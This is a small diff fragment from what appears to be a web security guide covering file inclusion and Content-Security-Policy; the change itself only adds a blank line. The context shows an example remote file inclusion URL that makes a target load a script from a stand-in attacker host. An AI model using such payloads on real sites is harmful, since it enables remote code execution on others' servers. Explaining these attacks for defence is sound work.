@@ -154,6 +154,7 @@ Content-Security-Policy: script-src 'self';
 ```
 http://example.com/index.php?file=http://attacker.com/malicious.php
 ```  
+
 <br>
 
 ## 7. Real-World Example
